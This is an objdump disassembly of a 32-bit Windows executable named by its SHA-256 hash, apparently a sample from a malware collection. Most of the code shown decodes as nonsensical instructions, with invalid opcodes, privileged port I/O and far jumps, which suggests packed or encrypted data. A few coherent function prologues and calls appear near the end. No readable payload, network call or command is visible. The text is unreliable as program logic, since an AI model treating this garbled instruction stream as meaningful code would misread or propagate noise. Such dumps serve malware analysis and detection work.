
6654b1530a26db41f03a4ed89060751be0018a68f2dd0395820501f37b3a0ea3.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	jbe    0x4d004d
  4d0002:	imul   ebx,DWORD PTR [eax-0x3e],0x48ce752f
  4d0009:	mov    ecx,0xf1c41c06
  4d000e:	scas   eax,DWORD PTR es:[edi]
  4d000f:	div    BYTE PTR [eax]
  4d0011:	and    eax,0x7639f57c
  4d0016:	cmc    
  4d0017:	add    bl,BYTE PTR [eax]
  4d0019:	loop   0x4cffb5
  4d001b:	lea    edx,[edi+eiz*8]
  4d001e:	call   0x75baf056
  4d0023:	scas   al,BYTE PTR es:[edi]
  4d0024:	push   cs
  4d0025:	push   ss
  4d0026:	dec    edi
  4d0027:	inc    esi
  4d0028:	fcomi  st,st(7)
  4d002a:	mov    al,0xb9
  4d002c:	mov    BYTE PTR es:[ecx-0x1d223ba9],cl
  4d0033:	fld    TBYTE PTR [edi+0x50]
  4d0036:	adc    DWORD PTR [eax-0x40295002],0x6af45084
  4d0040:	fidiv  WORD PTR [ebx+ecx*1]
  4d0043:	ins    BYTE PTR es:[edi],dx
  4d0044:	scas   al,BYTE PTR es:[edi]
  4d0045:	mov    ds:0xdd8fd6f8,eax
  4d004a:	jg     0x4d00c5
  4d004c:	jb     0x4cfff0
  4d004e:	test   BYTE PTR [esi+0x6c638905],al
  4d0054:	add    DWORD PTR [edi-0x64],esi
  4d0057:	lock mov edi,DWORD PTR [esi+0x1d]
  4d005b:	and    BYTE PTR [esi-0x7f],dh
  4d005e:	loop   0x4cffec
  4d0060:	jae    0x4d00d3
  4d0062:	and    BYTE PTR [ebx-0x72],dh
  4d0065:	pop    ss
  4d0066:	mov    DWORD PTR es:[ebp-0x22],edx
  4d006a:	inc    esp
  4d006b:	ficom  DWORD PTR [ebx+eiz*2]
  4d006e:	daa    
  4d006f:	xchg   edx,eax
  4d0070:	pop    esp
  4d0071:	add    eax,0x6b06d321
  4d0076:	xor    eax,DWORD PTR [eax+0x8d4eafa]
  4d007c:	or     eax,0x3a5f2b7f
  4d0081:	repz cmp DWORD PTR [esi],eax
  4d0084:	das    
  4d0085:	push   ebp
  4d0086:	sub    ebx,DWORD PTR [ebx+0x42]
  4d0089:	jmp    DWORD PTR [edi]
  4d008b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d008c:	adc    al,0x9
  4d008e:	popa   
  4d008f:	mov    ds:0x766379f1,al
  4d0094:	jp     0x4d005c
  4d0096:	add    al,0x8a
  4d0098:	xchg   edi,eax
  4d0099:	cmp    ebx,edi
  4d009b:	fisttp QWORD PTR [esi]
  4d009d:	int    0x4
  4d009f:	and    bl,BYTE PTR [ebp+0x33]
  4d00a2:	cli    
  4d00a3:	xor    esi,DWORD PTR [edi+edx*2-0x57132e02]
  4d00aa:	add    DWORD PTR [esi],ebp
  4d00ac:	gs in  al,0xb3
  4d00af:	mov    ds:0x174c1b95,al
  4d00b4:	adc    bl,ch
  4d00b6:	mov    bl,0xe8
  4d00b8:	in     al,0xb9
  4d00ba:	verr   WORD PTR [esi-0x47000fb5]
  4d00c1:	adc    dl,BYTE PTR [edi+0x51436d34]
  4d00c7:	lds    ebx,FWORD PTR [eax-0x5fdd5144]
  4d00cd:	dec    eax
  4d00ce:	push   ecx
  4d00cf:	fucomp st(4)
  4d00d1:	scas   eax,DWORD PTR es:[edi]
  4d00d2:	sbb    DWORD PTR [ebx],esp
  4d00d4:	jg     0x4d0126
  4d00d6:	in     eax,0x52
  4d00d8:	out    0x6,al
  4d00da:	sbb    al,BYTE PTR [ebx]
  4d00dc:	inc    ebx
  4d00dd:	test   BYTE PTR [ebx],dh
  4d00df:	sub    BYTE PTR gs:[eax+eiz*1-0xd],bh
  4d00e4:	fdivr  DWORD PTR [eax-0x6285a2fd]
  4d00ea:	push   ebx
  4d00eb:	mov    ds:0xb5048edc,al
  4d00f0:	and    al,0xc7
  4d00f2:	adc    esi,DWORD PTR [ebx]
  4d00f4:	push   es
  4d00f5:	cmp    al,0xec
  4d00f7:	int3   
  4d00f8:	xchg   BYTE PTR [edx],cl
  4d00fa:	push   eax
  4d00fb:	sar    BYTE PTR [edi-0x5],0x15
  4d00ff:	aaa    
  4d0100:	ret    0xea1a
  4d0103:	call   0x6f9bfcbc
  4d0108:	cmp    DWORD PTR [eax-0x3e],0xa7bbd81b
  4d010f:	call   0x17d545a5
  4d0114:	jo     0x4d00d0
  4d0116:	call   0x6d91e553
  4d011b:	xlat   BYTE PTR ds:[ebx]
  4d011c:	test   al,0x38
  4d011e:	(bad)  
  4d011f:	js     0x4d00ce
  4d0121:	xor    DWORD PTR ds:0x50cda7de,eax
  4d0127:	cs scas al,BYTE PTR es:[edi]
  4d0129:	pushf  
  4d012a:	mov    cl,0x28
  4d012c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d012d:	mov    ecx,0x41e6a6d9
  4d0132:	sbb    bh,dh
  4d0134:	jns    0x4d00f3
  4d0136:	cmp    ecx,DWORD PTR [esi]
  4d0138:	loopne 0x4d0107
  4d013a:	xchg   edx,eax
  4d013b:	cmc    
  4d013c:	push   0x6e
  4d013e:	cli    
  4d013f:	sub    DWORD PTR [edi+0x619c5d1c],0xffffff9a
  4d0146:	in     al,0x77
  4d0148:	mov    ds:0xa73f2b5d,eax
  4d014d:	test   al,0x34
  4d014f:	dec    esp
  4d0150:	mov    eax,ds:0xd474506b
  4d0155:	aad    0x3a
  4d0157:	shl    DWORD PTR ds:0x6a185af,cl
  4d015d:	cmp    DWORD PTR [ebx+eiz*2],ecx
  4d0160:	sti    
  4d0161:	(bad)  
  4d0162:	jle    0x4d01c9
  4d0164:	xchg   ecx,eax
  4d0165:	and    BYTE PTR [ebp+0x5a81e582],0x7d
  4d016c:	pop    ds
  4d016d:	cmc    
  4d016e:	mov    ecx,0xd11b5981
  4d0173:	std    
  4d0174:	mov    ah,0xe7
  4d0176:	sub    DWORD PTR [esi-0x63],ebx
  4d0179:	mov    ds:0xadb4f4aa,eax
  4d017e:	lods   al,BYTE PTR ds:[esi]
  4d017f:	pop    esp
  4d0180:	lahf   
  4d0181:	mov    esp,0x42b9f457
  4d0186:	(bad)  
  4d0187:	pop    ss
  4d0188:	mov    eax,ds:0x533fc1f0
  4d018d:	mov    edx,0x39794b9d
  4d0192:	pop    es
  4d0193:	mov    ah,0xdd
  4d0195:	rcl    BYTE PTR [eax-0x53],cl
  4d0198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0199:	hlt    
  4d019a:	xlat   BYTE PTR ds:[ebx]
  4d019b:	xor    al,0xb
  4d019d:	hlt    
  4d019e:	xor    ecx,esp
  4d01a0:	test   BYTE PTR [ebx],0xb4
  4d01a3:	mov    ch,0xb
  4d01a5:	hlt    
  4d01a6:	dec    ebx
  4d01a7:	mov    ds:0x5df40c5e,al
  4d01ac:	mov    ds:0xb40a81f2,eax
  4d01b1:	cwde   
  4d01b2:	jns    0x4d0135
  4d01b4:	cmp    eax,0xc4829150
  4d01b9:	scas   eax,DWORD PTR es:[edi]
  4d01ba:	sar    BYTE PTR [edx+esi*2-0x80],cl
  4d01be:	sub    eax,0x5dd78f83
  4d01c3:	mov    ebp,0x4ee2b37e
  4d01c8:	mov    esp,0x492535a4
  4d01cd:	out    0xca,al
  4d01cf:	lds    ebp,FWORD PTR [edi+0x555e41a5]
  4d01d5:	mov    ds:0x851d2cfa,eax
  4d01da:	or     dl,cl
  4d01dc:	ins    DWORD PTR es:[edi],dx
  4d01dd:	repz movsx eax,WORD PTR [ecx+ebp*1]
  4d01e2:	push   esi
  4d01e3:	cmp    BYTE PTR [esi],bh
  4d01e5:	in     eax,dx
  4d01e6:	test   eax,0xba1f38e7
  4d01eb:	mov    ecx,0x4645e0e1
  4d01f0:	stos   DWORD PTR es:[edi],eax
  4d01f1:	pop    edi
  4d01f2:	jmp    0x4713:0x14a8ce42
  4d01f9:	aas    
  4d01fa:	(bad)  
  4d01fb:	out    dx,eax
  4d01fc:	mov    edx,0x9fd9fac0
  4d0201:	enter  0x4a79,0x7e
  4d0205:	cwde   
  4d0206:	(bad)  
  4d0207:	popf   
  4d0208:	shr    BYTE PTR [ebx+0x29],0x62
  4d020c:	cdq    
  4d020d:	adc    eax,0xec68f64f
  4d0212:	mov    al,0x9
  4d0214:	push   cs
  4d0215:	and    ebx,edx
  4d0217:	cli    
  4d0218:	pop    ss
  4d0219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d021a:	sub    ch,BYTE PTR [ecx]
  4d021c:	jmp    0x4f19:0x16d6d55b
  4d0223:	sub    eax,0x96711a3b
  4d0228:	es jno 0x4d01ad
  4d022b:	ins    DWORD PTR es:[edi],dx
  4d022c:	push   ecx
  4d022d:	retf   
  4d022e:	or     BYTE PTR [ecx+0x30],cl
  4d0231:	xor    eax,0xc156b6f7
  4d0236:	jge    0x4d01f4
  4d0238:	scas   al,BYTE PTR es:[edi]
  4d0239:	xor    DWORD PTR [esi],ecx
  4d023b:	ret    0x535f
  4d023e:	icebp  
  4d023f:	mov    dl,0xc
  4d0241:	mov    al,0x9
  4d0243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0244:	hlt    
  4d0245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0246:	cli    
  4d0247:	(bad)  
  4d0249:	iret   
  4d024a:	or     DWORD PTR [edi+0x33],esi
  4d024d:	xchg   dh,dh
  4d024f:	fsub   DWORD PTR [eax*1-0x121fc880]
  4d0256:	or     eax,edi
  4d0258:	into   
  4d0259:	xchg   edi,eax
  4d025a:	mov    ah,0xae
  4d025c:	cs xchg esp,eax
  4d025e:	inc    edx
  4d025f:	frstor [ecx-0x4b8cf136]
  4d0265:	lahf   
  4d0266:	cmc    
  4d0267:	frstor [edi+ebx*2+0x2bb32e60]
  4d026e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d026f:	push   esi
  4d0270:	push   cs
  4d0271:	gs jmp 0xcbff:0xa2ab3934
  4d0279:	stos   DWORD PTR es:[edi],eax
  4d027a:	or     al,BYTE PTR [esi+0x2310c8f6]
  4d0280:	or     esi,DWORD PTR [edi]
  4d0282:	out    dx,eax
  4d0283:	pop    esp
  4d0284:	imul   ecx,ebp,0xffffff9d
  4d0287:	out    0x99,eax
  4d0289:	xor    al,0x87
  4d028b:	pop    ss
  4d028c:	addr16 retf 
  4d028e:	clc    
  4d028f:	cmp    BYTE PTR [ecx+0x67db2ba9],bl
  4d0295:	lods   al,BYTE PTR ds:[esi]
  4d0296:	fmul   st(7),st
  4d0298:	test   DWORD PTR [ebx+eax*4],esi
  4d029b:	mov    ss,esp
  4d029d:	and    al,0xd1
  4d029f:	sar    DWORD PTR [esi+0x32],0x2e
  4d02a3:	xchg   esp,eax
  4d02a4:	(bad)  
  4d02a5:	and    eax,0xc5863255
  4d02aa:	cmp    ch,BYTE PTR [edi]
  4d02ac:	ds fwait
  4d02ae:	push   eax
  4d02af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02b0:	dec    esi
  4d02b1:	push   edi
  4d02b2:	mov    bl,0xd1
  4d02b4:	out    dx,eax
  4d02b5:	shl    DWORD PTR [edx+0x6cfe9762],cl
  4d02bb:	and    edi,edi
  4d02bd:	add    DWORD PTR [ebx+0x118c8dde],edx
  4d02c3:	and    dh,BYTE PTR [ebx+esi*2+0x79]
  4d02c7:	xchg   esp,eax
  4d02c8:	sub    eax,0x596b868d
  4d02cd:	imul   ecx,DWORD PTR [ecx+0x76972918],0x375bdbe7
  4d02d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02d8:	push   ds
  4d02d9:	test   al,0xc3
  4d02db:	lods   al,BYTE PTR ds:[esi]
  4d02dc:	outs   dx,BYTE PTR ds:[esi]
  4d02dd:	sbb    al,0x8d
  4d02df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02e0:	in     eax,0x33
  4d02e2:	fstp   QWORD PTR [edi-0x7c]
  4d02e5:	int3   
  4d02e6:	xor    ah,BYTE PTR [eax+0x48508a7d]
  4d02ec:	mov    ch,al
  4d02ee:	sbb    DWORD PTR [ecx+eiz*8+0x2043f63a],edi
  4d02f5:	sbb    al,0x8b
  4d02f7:	rol    BYTE PTR ds:0xfc3f84e4,0x1a
  4d02fe:	ror    esp,1
  4d0300:	add    al,0x3b
  4d0302:	cmp    ecx,DWORD PTR [ebp+0x3af07256]
  4d0308:	cld    
  4d0309:	sbb    al,bl
  4d030b:	xchg   esi,eax
  4d030c:	out    dx,al
  4d030d:	push   0x11
  4d030f:	outs   dx,BYTE PTR ds:[esi]
  4d0310:	inc    esi
  4d0311:	push   ebp
  4d0312:	push   ebp
  4d0313:	aas    
  4d0314:	and    DWORD PTR [ebx+ebp*4-0x10],edx
  4d0318:	push   esp
  4d0319:	mov    ah,0x79
  4d031b:	push   cs
  4d031c:	mov    esp,0x59f2864b
  4d0321:	mov    ebx,0xd201fc5b
  4d0326:	call   0x69cc0752
  4d032b:	sub    ah,bh
  4d032d:	mov    cl,0xfe
  4d032f:	xlat   BYTE PTR ds:[ebx]
  4d0330:	adc    eax,0x6f7f014e
  4d0335:	call   0x2f64:0x9691d103
  4d033c:	sub    BYTE PTR [ecx-0x65],0x27
  4d0340:	add    bl,BYTE PTR [ebx+0x650fd888]
  4d0346:	ja     0x4d036e
  4d0348:	inc    edi
  4d0349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d034a:	xchg   DWORD PTR [edi],ebp
  4d034c:	(bad)  
  4d034d:	mov    dl,0xd1
  4d034f:	sub    BYTE PTR [ebx-0x10b3082e],dl
  4d0355:	mov    cs,ebx
  4d0357:	adc    edi,ebp
  4d0359:	js     0x4d033c
  4d035b:	into   
  4d035c:	add    DWORD PTR ds:0x76c33453,edx
  4d0362:	xchg   ebp,eax
  4d0363:	push   edi
  4d0364:	xor    DWORD PTR [ebx+0x7b],eax
  4d0367:	test   al,0xd0
  4d0369:	mov    esp,0x4330436c
  4d036e:	xchg   ebx,eax
  4d036f:	jbe    0x4d0361
  4d0371:	mov    esp,0x24f9896c
  4d0376:	xchg   ebx,eax
  4d0377:	jbe    0x4d0380
  4d0379:	xor    ah,BYTE PTR [esi]
  4d037b:	xchg   ecx,eax
  4d037c:	cli    
  4d037d:	int    0xd9
  4d037f:	push   esi
  4d0380:	fnsave [ecx]
  4d0382:	es test eax,0x8b659eaf
  4d0388:	jbe    0x4d03a4
  4d038a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d038b:	je     0x4d0318
  4d038d:	in     eax,0x43
  4d038f:	push   ebx
  4d0390:	jne    0x4d03ac
  4d0392:	mov    esp,0xe718a38
  4d0397:	mov    al,0x35
  4d0399:	mov    ?,ecx
  4d039b:	dec    edi
  4d039c:	push   DWORD PTR [ecx]
  4d039e:	pop    edi
  4d039f:	jno    0x4d036b
  4d03a1:	aad    0x61
  4d03a3:	xchg   ebx,eax
  4d03a4:	pop    ebx
  4d03a5:	aaa    
  4d03a6:	lahf   
  4d03a7:	jo     0x4d0373
  4d03a9:	je     0x4d0390
  4d03ab:	dec    edi
  4d03ac:	lods   al,BYTE PTR ds:[esi]
  4d03ad:	jl     0x4d0422
  4d03af:	cmp    ecx,DWORD PTR [edi+edi*4+0x51]
  4d03b3:	cmp    DWORD PTR [eax-0x2b5bdc76],edi
  4d03b9:	test   eax,0x56371500
  4d03be:	(bad)  
  4d03bf:	jmp    0xd04e:0x15003fb2
  4d03c6:	mov    dh,0xf7
  4d03c8:	or     DWORD PTR [esi+0x7200c19a],ecx
  4d03ce:	gs ds jmp 0x180e9de8
  4d03d5:	inc    esi
  4d03d6:	dec    esi
  4d03d7:	mov    esi,0xcbb1b9e9
  4d03dc:	mov    WORD PTR [edx+0x6a],gs
  4d03df:	xchg   ebp,eax
  4d03e0:	cmp    bh,ah
  4d03e2:	push   esi
  4d03e3:	push   ebx
  4d03e4:	out    0xd1,al
  4d03e6:	leave  
  4d03e7:	lods   al,BYTE PTR ds:[esi]
  4d03e8:	sbb    ebp,DWORD PTR [esi]
  4d03ea:	jle    0x4d03b3
  4d03ec:	push   ss
  4d03ed:	mov    eax,DWORD PTR [eax+edi*1+0x3bc374eb]
  4d03f4:	ds inc esp
  4d03f6:	pop    ebp
  4d03f7:	(bad)
  4d03fb:	scas   eax,DWORD PTR es:[edi]
  4d03fc:	pop    esi
  4d03fd:	std    
  4d03fe:	sbb    DWORD PTR [eax-0x5d],edx
  4d0401:	add    ch,BYTE PTR [esi]
  4d0403:	and    al,0x76
  4d0405:	mov    dh,0x12
  4d0407:	fmul   QWORD PTR [ebx-0x7967cab7]
  4d040d:	outs   dx,DWORD PTR ds:[esi]
  4d040e:	iret   
  4d040f:	addr16 jnp 0x4d03a2
  4d0412:	js     0x4d0420
  4d0414:	mov    gs,WORD PTR [eax]
  4d0416:	enter  0x73f3,0xd7
  4d041a:	jg     0x4d039c
  4d041c:	mov    ?,WORD PTR [ebx-0x52c926bf]
  4d0422:	dec    ecx
  4d0423:	jl     0x4d0460
  4d0425:	aam    0xa8
  4d0427:	adc    eax,0x75cf71b0
  4d042c:	sahf   
  4d042d:	idiv   BYTE PTR [ebx-0x63791978]
  4d0433:	ja     0x4d03c4
  4d0435:	jl     0x4d049b
  4d0437:	std    
  4d0438:	retf   0xe10e
  4d043b:	bound  edi,QWORD PTR [ecx+esi*4-0x6b314d6d]
  4d0442:	test   al,0x9f
  4d0444:	in     eax,dx
  4d0445:	outs   dx,DWORD PTR ds:[esi]
  4d0446:	push   edi
  4d0447:	pusha  
  4d0448:	adc    al,0x78
  4d044a:	dec    esi
  4d044b:	mov    eax,ds:0x620b87ed
  4d0450:	add    al,0x7c
  4d0452:	in     al,dx
  4d0453:	leave  
  4d0454:	lds    edi,FWORD PTR [edi+0x4db18e88]
  4d045a:	jp     0x4d0442
  4d045c:	lods   al,BYTE PTR ds:[esi]
  4d045d:	mov    ch,0x2
  4d045f:	jbe    0x4d03e1
  4d0461:	xchg   edi,eax
  4d0462:	pop    ecx
  4d0463:	cmovp  ebx,ebp
  4d0466:	mov    cl,0x9d
  4d0468:	pop    es
  4d0469:	push   esi
  4d046a:	adc    BYTE PTR [ebp+0x46d92da5],bh
  4d0470:	ds mov dh,0x88
  4d0473:	jl     0x4d0498
  4d0475:	int    0xf4
  4d0477:	iret   
  4d0478:	fisub  WORD PTR [esi+0x5932181d]
  4d047e:	loop   0x4d0467
  4d0480:	pop    edx
  4d0481:	and    al,0x72
  4d0483:	popf   
  4d0484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0485:	push   eax
  4d0486:	xchg   esp,eax
  4d0487:	or     eax,0xf26c5343
  4d048c:	mov    esi,0x426e570d
  4d0491:	dec    eax
  4d0492:	in     eax,0x1c
  4d0494:	xchg   edi,eax
  4d0495:	inc    ebx
  4d0496:	nop
  4d0497:	das    
  4d0498:	cmc    
  4d0499:	add    eax,eax
  4d049b:	and    BYTE PTR [esi+eiz*2+0x40],bl
  4d049f:	fbstp  TBYTE PTR [ecx-0x5adfed67]
  4d04a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d04a6:	inc    esi
  4d04a7:	xor    bh,ah
  4d04a9:	push   ecx
  4d04aa:	lods   eax,DWORD PTR ds:[esi]
  4d04ab:	je     0x4d04af
  4d04ad:	out    0x52,eax
  4d04af:	mov    edi,edi
  4d04b1:	pusha  
  4d04b2:	ss mov ecx,0x3f54bf26
  4d04b8:	push   0x99c5684d
  4d04bd:	mov    dl,0x97
  4d04bf:	sahf   
  4d04c0:	or     DWORD PTR [esi+0x68],esp
  4d04c3:	popa   
  4d04c4:	clc    
  4d04c5:	and    al,0x8
  4d04c7:	retf   
  4d04c8:	pop    edx
  4d04c9:	inc    ebx
  4d04ca:	clc    
  4d04cb:	xor    al,0xb3
  4d04cd:	mov    esp,0x83a3ca5a
  4d04d2:	xor    al,BYTE PTR [edx+0x16]
  4d04d5:	or     al,0xcf
  4d04d7:	or     eax,0xeabcc376
  4d04dc:	jle    0x4d04c0
  4d04de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04df:	mov    dh,0x9b
  4d04e1:	sbb    eax,0x22f54958
  4d04e6:	aam    0x17
  4d04e8:	iret   
  4d04e9:	cmp    eax,0xc452d4ad
  4d04ee:	push   edx
  4d04ef:	sub    edx,DWORD PTR [edi]
  4d04f1:	pusha  
  4d04f2:	scas   eax,DWORD PTR es:[edi]
  4d04f3:	aam    0xea
  4d04f5:	rol    BYTE PTR [esi-0x6a],cl
  4d04f8:	pop    ss
  4d04f9:	xchg   edi,eax
  4d04fa:	shr    DWORD PTR [eax+0x3f],0x85
  4d04fe:	leave  
  4d04ff:	outs   dx,DWORD PTR ds:[esi]
  4d0500:	push   ss
  4d0501:	into   
  4d0502:	xor    eax,0xebd1fe6
  4d0507:	inc    BYTE PTR ds:[ebp+0x31]
  4d050b:	dec    BYTE PTR [esi+0x73028f3a]
  4d0511:	(bad)
  4d0514:	add    bh,BYTE PTR [eax+edx*2]
  4d0517:	xchg   esi,eax
  4d0518:	push   edx
  4d0519:	ret    
  4d051a:	add    eax,0x6ffd34a2
  4d051f:	inc    ebx
  4d0520:	and    BYTE PTR [edx],al
  4d0522:	out    0xd4,al
  4d0524:	(bad)
  4d0529:	cmp    eax,0xde86474a
  4d052e:	push   ss
  4d052f:	jl     0x4d050c
  4d0531:	mov    DWORD PTR [ebp-0x10],edx
  4d0534:	es jbe 0x4d0549
  4d0537:	or     BYTE PTR [edi-0x48],0x51
  4d053b:	out    0x1f,al
  4d053d:	mov    ebx,0x44367d24
  4d0542:	xor    DWORD PTR [edi-0x7ebb83b0],eax
  4d0548:	add    eax,0x817f1183
  4d054d:	cmp    eax,0xc2eace63
  4d0552:	add    al,0x9b
  4d0554:	test   DWORD PTR [ecx-0x3a1d329f],esi
  4d055a:	push   cs
  4d055b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d055c:	jae    0x4d04e8
  4d055e:	lock mov al,0x96
  4d0561:	clc    
  4d0562:	rcr    DWORD PTR [ebx-0xa],cl
  4d0565:	idiv   DWORD PTR [eax+edi*8+0x75]
  4d0569:	dec    eax
  4d056a:	in     eax,dx
  4d056b:	push   cs
  4d056c:	loop   0x4d0524
  4d056e:	push   0xeb9977fd
  4d0573:	push   edx
  4d0574:	hlt    
  4d0575:	ins    DWORD PTR es:[edi],dx
  4d0576:	push   0xffffff95
  4d0578:	xor    edx,DWORD PTR [edx-0x55a6956b]
  4d057e:	mov    ss,WORD PTR [esi]
  4d0580:	outs   dx,DWORD PTR ds:[esi]
  4d0581:	push   0x192e971
  4d0586:	xchg   esi,eax
  4d0587:	outs   dx,DWORD PTR ds:[esi]
  4d0588:	bound  esp,QWORD PTR [ebx+0x8651bb1]
  4d058e:	fsub   QWORD PTR [edx-0x6b]
  4d0591:	test   al,0x8c
  4d0593:	inc    edi
  4d0594:	les    eax,FWORD PTR [edx]
  4d0596:	and    al,0x7c
  4d0598:	out    0xfc,eax
  4d059a:	xor    DWORD PTR [eax+0x7c928672],edx
  4d05a0:	lock cmp al,0xc6
  4d05a3:	and    cl,0x18
  4d05a6:	and    bl,BYTE PTR [eax+eiz*1]
  4d05a9:	out    0xdd,eax
  4d05ab:	inc    eax
  4d05ac:	outs   dx,BYTE PTR ds:[esi]
  4d05ad:	pop    esi
  4d05ae:	xchg   edx,eax
  4d05af:	inc    edx
  4d05b0:	push   ebx
  4d05b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d05b2:	test   BYTE PTR [ecx],0xd2
  4d05b5:	imul   esp,DWORD PTR [esi-0x2],0x199962f
  4d05bc:	shr    BYTE PTR [ecx-0x32],cl
  4d05bf:	(bad)  
  4d05c0:	das    
  4d05c1:	xchg   esi,eax
  4d05c2:	xor    esp,eax
  4d05c4:	cmp    BYTE PTR [ebp-0x4f7c5d3c],bl
  4d05ca:	xchg   ebp,eax
  4d05cb:	ret    
  4d05cc:	sub    esi,DWORD PTR [esi+0x524a0c9d]
  4d05d2:	jecxz  0x4d05b5
  4d05d4:	mov    ecx,0x331e1cbd
  4d05d9:	xor    BYTE PTR [ecx+0x40],dh
  4d05dc:	int3   
  4d05dd:	push   esp
  4d05de:	mov    ?,WORD PTR ds:0x4e83726
  4d05e4:	inc    ecx
  4d05e5:	sub    DWORD PTR [eax+0x40],0x4d
  4d05e9:	mov    cl,0xb5
  4d05eb:	and    eax,0xaa7db561
  4d05f0:	adc    eax,0x1fa7462b
  4d05f5:	sahf   
  4d05f6:	sti    
  4d05f7:	and    DWORD PTR [edx+ebx*8+0x105ff008],0xffffffef
  4d05ff:	inc    ebx
  4d0600:	(bad)  
  4d0602:	rcr    BYTE PTR [esi-0x130f9965],cl
  4d0608:	jecxz  0x4d060b
  4d060a:	jp     0x4d0623
  4d060c:	xchg   dh,bh
  4d060e:	xchg   ebp,eax
  4d060f:	call   0x18215e8f
  4d0614:	test   ebp,edi
  4d0616:	cmp    esi,DWORD PTR [ebx+0x6c]
  4d0619:	test   BYTE PTR [eax+0x4f7b9691],dh
  4d061f:	stc    
  4d0620:	addr16 in eax,dx
  4d0622:	mov    ah,0x7
  4d0624:	call   0x7e43:0x664ba212
  4d062b:	push   ds
  4d062c:	fwait
  4d062d:	and    al,0x2
  4d062f:	loop   0x4d0697
  4d0631:	(bad)  [edi+0x21]
  4d0634:	add    eax,0x64e00225
  4d0639:	(bad)  
  4d063b:	pop    ds
  4d063c:	sbb    eax,0x836017c
  4d0641:	add    eax,0xfafacec3
  4d0646:	cmp    al,0xf4
  4d0648:	xchg   edi,eax
  4d0649:	pop    ebp
  4d064a:	ret    0x65dc
  4d064d:	ja     0x4d062f
  4d064f:	test   BYTE PTR [esi],ah
  4d0651:	lds    esp,FWORD PTR [ebx]
  4d0653:	enter  0xf328,0x8b
  4d0657:	add    al,0xb6
  4d0659:	dec    eax
  4d065a:	or     eax,0x3b436b82
  4d065f:	loopne 0x4d06d8
  4d0661:	das    
  4d0662:	sahf   
  4d0663:	cmp    ebp,DWORD PTR [edx-0x73]
  4d0666:	inc    eax
  4d0667:	xor    DWORD PTR [edx],esi
  4d0669:	and    DWORD PTR [ebx+eiz*4-0x71],ebx
  4d066d:	add    ch,ch
  4d066f:	clc    
  4d0670:	dec    edx
  4d0671:	imul   eax,eax,0x1e
  4d0674:	mov    ch,0x5e
  4d0676:	jmp    0x77c2:0xb00d9266
  4d067d:	jne    0x4d06da
  4d067f:	in     al,0x43
  4d0681:	jno    0x4d063e
  4d0683:	sbb    al,0xfe
  4d0685:	stos   BYTE PTR es:[edi],al
  4d0686:	inc    ebp
  4d0687:	outs   dx,BYTE PTR ds:[esi]
  4d0688:	mov    esi,0xd0599c9d
  4d068d:	and    eax,eax
  4d068f:	int3   
  4d0690:	xor    esi,DWORD PTR [ecx+0x7f]
  4d0693:	jmp    0x7133:0x15808ece
  4d069a:	jg     0x4d0686
  4d069c:	into   
  4d069d:	mov    es,WORD PTR [eax+0x7f713315]
  4d06a3:	jmp    0x7133:0x15808ece
  4d06aa:	jg     0x4d0696
  4d06ac:	into   
  4d06ad:	mov    es,WORD PTR [eax+0x7fd23315]
  4d06b3:	jmp    0x7e33:0x158585ce
  4d06ba:	jp     0x4d06a6
  4d06bc:	push   edi
  4d06bd:	mov    ah,BYTE PTR [ebx+ecx*1-0x5e]
  4d06c1:	cld    
  4d06c2:	xor    al,0xdc
  4d06c5:	push   0x76f27783
  4d06ca:	pop    esp
  4d06cb:	jmp    0x4d0747
  4d06cd:	xchg   ebx,eax
  4d06ce:	fnstcw WORD PTR [edi]
  4d06d0:	and    BYTE PTR [esi+0x28de0852],bh
  4d06d6:	arpl   WORD PTR [eax+edx*2+0x41],dx
  4d06da:	imul   edi,DWORD PTR [edx-0x3e],0x8b74baf
  4d06e1:	clc    
  4d06e2:	adc    eax,0xe86389ac
  4d06e7:	jnp    0x4d0694
  4d06e9:	out    0xd4,al
  4d06eb:	mov    WORD PTR [ebx-0x1374aa01],cs
  4d06f1:	sub    esp,0x58
  4d06f4:	lea    eax,[esi+0xc]
  4d06f7:	or     DWORD PTR [eax+0xcc],0x6eaf
  4d0701:	push   eax
  4d0702:	push   0x0
  4d0704:	call   0x4d0df8
  4d0709:	add    esp,0x4
  4d070c:	pop    eax
  4d070d:	push   eax
  4d070e:	push   DWORD PTR [eax+0x44]
  4d0711:	push   esi
  4d0712:	push   DWORD PTR [eax+0x1d4]
  4d0718:	call   0x4d1268
  4d071d:	add    esp,0xc
  4d0720:	pop    eax
  4d0721:	push   eax
  4d0722:	call   0x4d07a8
  4d0727:	add    esp,0x4
  4d072a:	pop    eax
  4d072b:	add    esp,0x58
  4d072e:	pop    ebp
  4d072f:	ret    
  4d0730:	mov    edi,edi
  4d0732:	push   ebp
  4d0733:	mov    ebp,esp
  4d0735:	sub    esp,0x3c
  4d0738:	lea    edx,ds:0x4d30d4
  4d073e:	and    ecx,ebx
  4d0740:	push   edx
  4d0741:	push   0x0
  4d0743:	call   0x4d0cb4
  4d0748:	add    esp,0x4
  4d074b:	pop    edx
  4d074c:	push   edx
  4d074d:	push   DWORD PTR [edx+0xa8]
  4d0753:	push   DWORD PTR [edx+0x88]
  4d0759:	push   DWORD PTR [edx+0x198]
  4d075f:	call   0x4d12c8
  4d0764:	add    esp,0xc
  4d0767:	pop    edx
  4d0768:	push   edx
  4d0769:	lea    edx,[edx-0xd4]
  4d076f:	push   edx
  4d0770:	call   0x4d08d4
  4d0775:	add    esp,0x4
  4d0778:	test   eax,eax
